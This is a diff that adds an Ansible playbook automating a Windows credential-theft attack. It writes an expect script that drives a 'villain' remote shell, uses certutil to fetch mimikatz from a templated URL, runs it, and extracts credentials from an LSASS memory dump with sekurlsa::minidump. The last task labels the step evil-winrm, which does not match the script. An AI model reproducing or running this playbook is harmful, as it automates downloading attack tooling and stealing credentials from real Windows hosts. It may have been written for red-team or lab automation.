@@ -1,1 +1,26 @@
+---
+- name: Villain
+  copy:
+    dest: /opt/run_mimikatz.sh
+    content: |
+      #!/usr/bin/expect -f
+      set timeout -1
+      spawn villain
+      expect "PS C:\\Users\\Administrator\\Documents> "
+      send "certutil -urlcache -split -f {{ mimikatz_url }} {{ mimikatz_dest }}\r"
+      expect "PS C:\\Users\\Administrator\\Documents> "
+      send "{{ mimikatz_dest }}\r"
+      expect "mimikatz #"
+      send "sekurlsa::minidump {{ lsass_dump_dest }}\r"
+      expect "mimikatz #"
+      send "exit\r"
+      interact
 
+- name: Make the script executable
+  file:
+    path: /opt/run_mimikatz.sh
+    mode: '0755'
+
+
+- name: Run the evil-winrm script to dump lsass
+  shell: /opt/run_mimikatz.sh
